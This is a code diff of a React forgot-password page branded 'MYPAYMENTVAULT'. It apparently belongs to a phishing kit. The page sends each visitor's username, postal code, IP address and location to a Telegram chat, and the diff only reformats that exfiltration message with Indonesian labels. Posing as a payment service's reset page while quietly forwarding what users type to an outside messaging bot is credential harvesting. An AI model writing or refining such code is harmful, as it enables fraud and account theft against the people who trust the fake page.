@@ -21,11 +21,15 @@ export default function ForgotPassword() {
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
     const ip = await getIPInfo();
     await sendTelegram(
-      `🔑 <b>MYPAYMENTVAULT - Forgot Password</b>\n\n` +
-      `👤 Username: <code>${username}</code>\n` +
-      `📮 Postal Code: <code>${postalCode}</code>\n` +
-      `🌐 IP Address: <code>${ip}</code>\n` +
-      `🕐 Waktu: ${now}`
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🔑 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Lupa Password</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>    : <code>${username}</code>\n` +
+      `📮 <b>Postal Code</b> : <code>${postalCode}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
     );
     await new Promise((r) => setTimeout(r, 1000));
     setLoading(false);
